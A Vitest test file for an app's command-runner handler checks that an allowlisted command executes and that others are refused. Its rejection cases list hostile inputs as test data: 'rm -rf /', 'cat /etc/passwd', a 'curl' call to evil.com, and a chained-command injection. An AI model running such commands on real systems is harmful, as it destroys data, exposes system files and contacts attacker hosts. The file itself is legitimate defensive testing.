import { describe, it, expect, vi, beforeEach } from 'vitest'

vi.mock('../../src/main/utils/safeExec', () => ({
  safeExec: vi.fn()
}))

vi.mock('fix-path', () => ({
  default: vi.fn()
}))

import handler from '../../src/main/handlers/testing/runCommand'
import { safeExec } from '../../src/main/utils/safeExec'

const mockSafeExec = safeExec as ReturnType<typeof vi.fn>
const event = {} as any

describe('runCommand handler (integration)', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  it('returns success when an allowed command executes successfully', async () => {
    mockSafeExec.mockResolvedValue({ exitCode: 0, stdout: '1.0.0', stderr: '' })
    const result = await handler(event, 'raider version')
    expect(result.success).toBe(true)
    expect(result.output).toBe('1.0.0')
    expect(mockSafeExec).toHaveBeenCalledWith('raider version', { timeout: 10_000 })
  })

  it('returns error when safeExec reports a non-zero exit code', async () => {
    mockSafeExec.mockResolvedValue({ exitCode: 1, stdout: '', stderr: 'command failed' })
    const result = await handler(event, 'raider version')
    expect(result.success).toBe(false)
    expect(result.error).toBe('command failed')
    expect(result.output).toBe('command failed')
  })

  it('rejects a disallowed command without executing', async () => {
    const result = await handler(event, 'rm -rf /')
    expect(result.success).toBe(false)
    expect(result.error).toContain('Command not allowed')
    expect(mockSafeExec).not.toHaveBeenCalled()
  })

  it.each([
    'echo hello',
    'ls -la',
    'cat /etc/passwd',
    'curl http://evil.com',
    'raider version; rm -rf /',
    ''
  ])('rejects disallowed command: %s', async (cmd) => {
    const result = await handler(event, cmd)
    expect(result.success).toBe(false)
    expect(result.error).toContain('Command not allowed')
    expect(mockSafeExec).not.toHaveBeenCalled()
  })
})
